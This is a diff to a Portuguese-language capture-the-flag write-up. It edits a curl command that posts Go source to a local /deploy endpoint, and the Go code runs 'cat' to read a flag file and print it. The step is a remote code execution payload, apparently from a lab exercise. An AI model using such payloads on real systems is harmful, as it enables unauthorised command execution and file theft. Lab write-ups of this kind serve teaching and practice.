@@ -25,25 +25,23 @@ Após encontrar esse arquivo, ele irá dar uma flag por conta do fuzz, com isso 
 
 ```sh
 curl -X POST -d 'package main
-
 import (
-	"fmt"
-	"os/exec"
+		"fmt"
+		"os/exec"
 )
 
 func main() {
-	// Comando para executar o script shell
-	cmd := exec.Command("cat", "/root/flag.txt")
+		// Comando para executar o script shell
+		cmd := exec.Command("cat", "flag.txt")
 
-	// Executa o comando e captura a saÃ­da
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Println("Erro ao executar o script:", err)
-		return
-	}
-
-	// Imprime a saÃ­da do script
-	fmt.Println(string(output))
+		// Executa o comando e captura
+		output, err := cmd.CombinedOutput()      
+		if err != nil {
+				fmt.Println("Erro ao executar o script:", err)
+				return
+		}
+		// Imprime 
+		fmt.Println(string(output)) 
 }
 ' http://localhost:8080/deploy
 
